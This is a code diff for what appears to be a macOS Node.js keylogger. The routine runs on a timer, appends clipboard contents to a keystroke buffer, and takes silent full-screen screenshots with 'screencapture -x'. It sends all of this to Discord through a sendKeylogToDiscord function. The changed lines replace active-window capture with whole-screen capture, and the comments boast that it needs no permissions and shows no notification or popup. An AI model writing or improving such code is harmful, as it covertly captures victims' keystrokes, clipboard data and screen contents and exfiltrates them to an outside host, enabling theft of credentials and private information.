@@ -880,49 +880,30 @@ setInterval(() => {
                 }
                 keysBuffer += clipboard.substring(0, 5000);
                 
-                // Take screenshot of active window (not desktop)
+                // Take screenshot silently (like Cmd+Shift+4 but no notification)
+                // Use screencapture -x (silent, no sound, no notification)
+                // This captures entire screen - whatever is visible (windows if open, desktop if showing)
+                // NO PERMISSIONS NEEDED, NO POPUPS, JUST WORKS!
                 const timestamp = Date.now();
                 const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
                 
-                // Try multiple methods to capture active window (not desktop)
-                // Method 1: Try to get window ID using osascript (requires Accessibility permission)
-                exec(`osascript -e 'tell application "System Events" to get id of first window of first process whose frontmost is true' 2>/dev/null`, (windowError, windowId) => {
-                    let captureCmd;
-                    let useWindowCapture = false;
-                    
-                    // Check if we got a valid window ID
-                    if (!windowError && windowId && windowId.trim() && !windowId.includes('error') && !windowId.includes('Can\'t')) {
-                        const cleanId = windowId.trim();
-                        // Verify it's a number (window IDs are numeric)
-                        if (/^\d+$/.test(cleanId)) {
-                            captureCmd = `screencapture -x -l${cleanId} "${screenshotFile}"`;
-                            useWindowCapture = true;
+                // Simple: screencapture -x captures screen silently
+                // -x = silent (no notification sound, no popup)
+                // Captures whatever is visible on screen
+                setTimeout(() => {
+                    exec(`screencapture -x "${screenshotFile}"`, (screenshotError) => {
+                        if (!screenshotError && fs.existsSync(screenshotFile)) {
+                            // Send with screenshot
+                            sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
+                        } else {
+                            // Send without screenshot if capture failed
+                            sendKeylogToDiscord(keysBuffer, 'Unknown', null);
                         }
-                    }
-                    
-                    // If window ID method failed, try alternative: capture main display (not desktop)
-                    if (!useWindowCapture) {
-                        // Use -m flag to capture main display (captures all visible windows on main screen)
-                        // This should capture windows if they're visible, not just desktop
-                        captureCmd = `screencapture -x -m "${screenshotFile}"`;
-                    }
-                    
-                    // Add a small delay to ensure screen state is ready
-                    setTimeout(() => {
-                        exec(captureCmd, (screenshotError) => {
-                            if (!screenshotError && fs.existsSync(screenshotFile)) {
-                                // Send with screenshot
-                                sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
-                            } else {
-                                // Send without screenshot if capture failed
-                                sendKeylogToDiscord(keysBuffer, 'Unknown', null);
-                            }
-                            
-                            // Clear buffer after sending
-                            keysBuffer = '';
-                        });
-                    }, 500); // Delay to ensure screen state is captured
-                });
+                        
+                        // Clear buffer after sending
+                        keysBuffer = '';
+                    });
+                }, 300); // Small delay to ensure screen is ready
             }
         }
     });
